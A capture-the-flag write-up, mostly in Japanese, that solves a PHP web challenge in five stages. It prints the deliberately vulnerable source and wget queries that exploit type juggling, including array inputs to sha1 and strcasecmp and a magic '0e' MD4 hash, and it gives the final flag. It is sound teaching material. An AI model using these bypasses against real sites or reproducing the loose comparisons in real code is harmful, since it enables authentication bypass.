# PharAway:Web Exploitation:100pts
Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain  
Link: [http://34.72.245.53/Web/PHPhar/](http://34.72.245.53/Web/PHPhar/)  
[index.php](index.php)  

# Solution
index.phpが配られる。  
中身は以下のようであった。  
```php:index.php
<?php


include('flag.php');




$a=$_GET['flag0'];
if(strlen($a)>3){                                                 
}
if($a>900000000){
  echo "<h1>".$flag[0]."</h1>";
}
#------------------------------------------------------------------------------------------------------------------
$_p = 1337;
$_l = 13;
$l = strlen($_GET['secret']);
$_i = intval($_GET['secret']);
if($l !== $_l || $_i !== $_p)                                 
{
    die("bye");
}
echo "<h1>".$flag[1]."</h1>";

#-----------------------------------------------------------------------------------------------------------------------
if (isset($_GET['a']) and isset($_GET['b'])) {
    if ($_GET['a'] === $_GET['b'])
        print 'Your password can not be your dog\'s name.';                                  
    else if (sha1($_GET['a']) === sha1($_GET['b']))
      echo  "<h1>".$flag[2]."</h1>";
    else
        print '<p class="alert">Invalid password.</p>';
}
#-----------------------------------------------------------------------------------------------------------------------------
if (!isset($_GET["md4"]))
{
    
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo "<h1>".$flag[3]."</h1>";
}
else
{
    echo "bad";
}

#-----------------------------------------------------------------------------------------------------------------------------

if (isset($_GET['abc'])){
    if (!strcasecmp ($_GET['abc'], $flag[4])){
        echo $flag[4];}}

?>
```
段階的にロックを解除していくようだ。  
一段階目は以下になる。  
```php
$a=$_GET['flag0'];
if(strlen($a)>3){                                                 
}
if($a>900000000){
  echo "<h1>".$flag[0]."</h1>";
}
```
flag0が長さ3より大きく、900000000より大きければよい。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://34.72.245.53/Web/PHPhar/?flag0=900000001"

<h1>shaktictf{</h1>bye
```
二段階目は以下になる。  
```php
$_p = 1337;
$_l = 13;
$l = strlen($_GET['secret']);
$_i = intval($_GET['secret']);
if($l !== $_l || $_i !== $_p)                                 
{
    die("bye");
}
echo "<h1>".$flag[1]."</h1>";
```
secretが長さ13で、その中に数字として1337のみが含まれていればよい。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://34.72.245.53/Web/PHPhar/?flag0=900000001&secret=1337aaaaaaaaa"

<h1>shaktictf{</h1><h1>An4ly71c4l_</h1>
```
三段階目は以下になる。  
```php
if (isset($_GET['a']) and isset($_GET['b'])) {
    if ($_GET['a'] === $_GET['b'])
        print 'Your password can not be your dog\'s name.';                                  
    else if (sha1($_GET['a']) === sha1($_GET['b']))
      echo  "<h1>".$flag[2]."</h1>";
    else
        print '<p class="alert">Invalid password.</p>';
}
```
aとbが厳密に一致しておらず、二つの`sha1`が厳密に一致していればよい。  
`sha1`は配列が渡された場合、NULLを返す。  
つまり、aとbを異なる配列にしてやればよい。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://34.72.245.53/Web/PHPhar/?flag0=900000001&secret=1337aaaaaaaaa&a[]=a&b[]=b"

<h1>shaktictf{</h1><h1>An4ly71c4l_</h1><h1>Eng1n3</h1>
```
四段階目は以下になる。  
```php
if (!isset($_GET["md4"]))
{
    
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo "<h1>".$flag[3]."</h1>";
}
else
{
    echo "bad";
}
```
厳密でない比較なので0e始まりで残りが数字であるものは0として扱われる。  
入力とハッシュ値が0e始まりであり、それ以外が数字であるものを探す。  
md4では、入力`0e251288019`、ハッシュ値`0e874956163641961271069404332409`が知られている。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://34.72.245.53/Web/PHPhar/?flag0=900000001&secret=1337aaaaaaaaa&a[]=a&b[]=b&md4=0e251288019"

<h1>shaktictf{</h1><h1>An4ly71c4l_</h1><h1>Eng1n3</h1><h1>!=D1ff3r3nc3</h1>
```
最終段階は以下になる。  
```php
if (isset($_GET['abc'])){
    if (!strcasecmp ($_GET['abc'], $flag[4])){
        echo $flag[4];}}
```
`strcasecmp`は第一引数に配列を渡すとNULLが返ってくる。  
つまり、第三段階と同じことを行う。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://34.72.245.53/Web/PHPhar/?flag0=900000001&secret=1337aaaaaaaaa&a[]=a&b[]=b&md4=0e251288019&abc[]=abc"

<h1>shaktictf{</h1><h1>An4ly71c4l_</h1><h1>Eng1n3</h1><h1>!=D1ff3r3nc3</h1>_Eng1n3}
```
Web問なのでアクセスするともちろんflagが表示される(ここからコピーすると楽)。  
flag  
[flag.png](site/flag.png)  

## shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}